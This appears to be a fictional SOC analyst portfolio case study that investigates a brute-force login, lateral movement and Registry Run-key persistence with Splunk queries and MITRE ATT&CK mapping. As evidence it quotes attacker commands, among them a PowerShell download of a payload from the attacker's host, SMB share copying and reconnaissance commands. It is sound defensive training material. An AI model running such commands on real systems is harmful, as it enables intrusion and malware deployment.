# Case 01 — Suspicious Login & Lateral Movement

![Splunk](https://img.shields.io/badge/Splunk-000000?style=for-the-badge&logo=splunk&logoColor=white)
![Sysmon](https://img.shields.io/badge/Sysmon-0078D4?style=for-the-badge&logo=microsoft&logoColor=white)
![Windows](https://img.shields.io/badge/Windows_Event_Logs-0078D6?style=for-the-badge&logo=windows&logoColor=white)
![VirusTotal](https://img.shields.io/badge/VirusTotal-394EFF?style=for-the-badge&logo=virustotal&logoColor=white)

---


> **⚠️ Educational Scenario**  
> This is a **fictional case study** created for portfolio demonstration purposes. While the investigation methodology, tools, and techniques are based on real-world SOC operations, the IP addresses, file hashes, hostnames, and log samples are synthetic. The IOCs will not return results in threat intelligence platforms (VirusTotal, AbuseIPDB, etc.) as they are not from actual malware campaigns.
>
> **What IS real:** Investigation methodology, SIEM query logic, MITRE ATT&CK mappings, incident response procedures.

## 📋 Case Summary

| Field | Details |
|---|---|
| **Case ID** | SOC-2024-001 |
| **Date** | 2024-03-14 |
| **Severity** | 🔴 High |
| **Status** | Closed — Confirmed Incident |
| **Analyst** | Camilo Castellote |
| **MITRE ATT&CK** | T1078, T1021.002, T1059.001, T1547.001 |

---

## 🚨 Alert Triggered

> **SIEM Rule:** Multiple failed logins followed by successful authentication from unusual IP  
> **Source:** Splunk — Windows Security Event Log  
> **Time:** 2024-03-14 02:17:43 UTC  

```
Alert: Brute Force Success — Threshold exceeded
Host: WORKSTATION-04
User: jsmith
Source IP: 185.220.101.47
Failed attempts: 23 in 4 minutes
Outcome: SUCCESS (EventID 4624)
```

---

## 🔍 Investigation Process

### Step 1 — Alert Triage & Validation

**Goal:** Determine if the alert is a true positive or false positive.

First, I checked the baseline behavior for user `jsmith` in Splunk:

```spl
index=windows sourcetype=WinEventLog:Security EventCode=4624
user=jsmith
| stats count by src_ip, host, Logon_Type
| sort - count
```

**Findings:**
- `jsmith` normally logs in from `10.10.5.22` (internal HR subnet) during business hours (08:00–17:00)
- The successful login came from `185.220.101.47` — an external IP — at 02:17 UTC
- Logon Type: **3 (Network)** — not an interactive desktop login
- ✅ Confirmed **True Positive** — anomalous source IP, time, and logon type

---

### Step 2 — Account & Authentication Analysis

**Goal:** Understand the scope of the brute force and what access was gained.

```spl
index=windows sourcetype=WinEventLog:Security
(EventCode=4625 OR EventCode=4624) src_ip=185.220.101.47
| table _time, EventCode, user, src_ip, host, Logon_Type, Failure_Reason
| sort _time
```

**Results:**

| Time (UTC) | EventID | User | Result | Note |
|---|---|---|---|---|
| 02:13:51 | 4625 | administrator | FAIL | Wrong password |
| 02:14:02 | 4625 | admin | FAIL | Account doesn't exist |
| 02:14:17 | 4625 | jsmith | FAIL | Wrong password (x21) |
| 02:17:43 | 4624 | jsmith | **SUCCESS** | Logon Type 3 |

**Conclusion:** Targeted brute force with username enumeration. Attacker tried common names before landing on `jsmith`.

---

### Step 3 — Process Execution Analysis (Sysmon)

**Goal:** Find what the attacker did after logging in.

```spl
index=sysmon EventCode=1 host=WORKSTATION-04
earliest="2024-03-14T02:17:43" latest="2024-03-14T03:00:00"
| table _time, user, ParentImage, Image, CommandLine
| sort _time
```

**Suspicious Process Chain Discovered:**

```
[02:18:05]  cmd.exe
               └── whoami /all
[02:18:22]  cmd.exe
               └── net user /domain
[02:18:41]  cmd.exe
               └── net group "Domain Admins" /domain
[02:19:10]  powershell.exe  ← ⚠️ encoded command
               └── -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAc...
[02:21:33]  cmd.exe
               └── net use \\FILESERVER-01\C$ /user:jsmith [REDACTED]
[02:21:55]  cmd.exe
               └── copy payload.exe \\FILESERVER-01\C$\Windows\Temp\svchost32.exe
```

**Decoded PowerShell Command:**

```powershell
Invoke-WebRequest -Uri http://185.220.101.47:8080/payload.exe -OutFile C:\Users\jsmith\AppData\Local\Temp\payload.exe
```

> ⚠️ **Attacker downloaded a payload from their own C2 server, then moved it to a second machine via SMB (lateral movement).**

---

### Step 4 — Network Traffic Analysis

**Goal:** Confirm C2 communication and lateral movement path.

```spl
index=network src_ip=185.220.101.47 OR dest_ip=185.220.101.47
| table _time, src_ip, dest_ip, dest_port, bytes_out, action
```

| Time | Direction | Destination | Port | Bytes | Note |
|---|---|---|---|---|---|
| 02:17:43 | Inbound | WORKSTATION-04 | 445 | 1.2KB | SMB auth |
| 02:19:10 | Outbound | 185.220.101.47 | 8080 | 428KB | **Payload download** |
| 02:21:55 | Internal | FILESERVER-01 | 445 | 432KB | **Lateral movement** |
| 02:23:10 | Outbound | 185.220.101.47 | 4444 | 2.1KB | **Reverse shell beacon** |

---

### Step 5 — Persistence Check

**Goal:** Determine if the attacker established persistence.

```spl
index=sysmon EventCode=13 host=WORKSTATION-04 OR host=FILESERVER-01
TargetObject="*\\CurrentVersion\\Run*"
earliest="2024-03-14T02:00:00"
```

**Registry Key Found:**

```
Host:         FILESERVER-01
Key:          HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
Value Name:   WindowsUpdateHelper
Value Data:   C:\Windows\Temp\svchost32.exe
Time:         2024-03-14 02:24:17 UTC
```

> ⚠️ **Attacker planted a Run key on FILESERVER-01 to survive reboots.**

---

### Step 6 — IOC Enrichment

**Goal:** Enrich identified indicators using threat intelligence.

**Suspicious File — `svchost32.exe`**

| Field | Value |
|---|---|
| **MD5** | `a3f1c2d4e5b6789012345678abcdef01` |
| **SHA256** | `deadbeef1234...abc9876543210` |
| **VirusTotal** | 54/72 engines flagged — **Cobalt Strike Beacon** |
| **File Size** | 428 KB |
| **Compile Time** | 2024-03-13 (day before attack) |

**Malicious IP — `185.220.101.47`**

| Field | Value |
|---|---|
| **AbuseIPDB Score** | 98/100 (highly malicious) |
| **ISP** | Tor exit node — DigitalOcean NL |
| **OTX Pulses** | Linked to Cobalt Strike C2 campaigns |
| **First Seen** | 2024-01-05 |

---

### Step 7 — Attack Timeline

```
02:13:51  Brute force begins from 185.220.101.47 against WORKSTATION-04
02:17:43  Successful login as jsmith (Logon Type 3 - Network)
02:18:05  Attacker runs recon commands (whoami, net user, net group)
02:19:10  PowerShell downloads payload.exe from C2 (port 8080)
02:21:33  Attacker connects to FILESERVER-01 via SMB using jsmith credentials
02:21:55  payload.exe copied to FILESERVER-01 as svchost32.exe
02:23:10  Reverse shell opens from FILESERVER-01 to 185.220.101.47:4444
02:24:17  Persistence set via Registry Run key on FILESERVER-01
```

---

## 🔴 Findings & Impact

| Category | Finding |
|---|---|
| **Initial Access** | Brute force of jsmith account via SMB (T1078) |
| **Execution** | Encoded PowerShell + payload download (T1059.001) |
| **Lateral Movement** | SMB file copy to FILESERVER-01 (T1021.002) |
| **Persistence** | Registry Run key — svchost32.exe (T1547.001) |
| **C2** | Cobalt Strike beacon to 185.220.101.47:4444 |
| **Affected Hosts** | WORKSTATION-04, FILESERVER-01 |
| **Affected Accounts** | jsmith |

---

## 🛡️ Containment & Recommendations

- [x] Blocked `185.220.101.47` at perimeter firewall
- [x] Disabled `jsmith` account pending password reset + MFA enrollment
- [x] Isolated WORKSTATION-04 and FILESERVER-01 from network
- [x] Removed persistence key from FILESERVER-01 registry
- [x] Deleted `svchost32.exe` from disk
- [ ] **Recommend:** Enforce MFA for all SMB/RDP network logons
- [ ] **Recommend:** Block PowerShell `-EncodedCommand` via GPO or AMSI rules
- [ ] **Recommend:** Alert on Logon Type 3 from external IPs

---

## 📎 Evidence Files

| File | Description |
|---|---|
| `logs/auth_events.txt` | Sanitized Windows Security Event Logs (4624/4625) |
| `logs/sysmon_processes.txt` | Sanitized Sysmon process creation events |
| `logs/network_traffic.txt` | Sanitized network connection logs |
| `iocs.txt` | All IOCs (IPs, hashes, file names) |

---

## 🗂️ MITRE ATT&CK Mapping

| Tactic | Technique | ID |
|---|---|---|
| Initial Access | Valid Accounts | T1078 |
| Execution | PowerShell | T1059.001 |
| Lateral Movement | SMB/Windows Admin Shares | T1021.002 |
| Persistence | Registry Run Keys | T1547.001 |
| Command & Control | Non-Standard Port | T1571 |
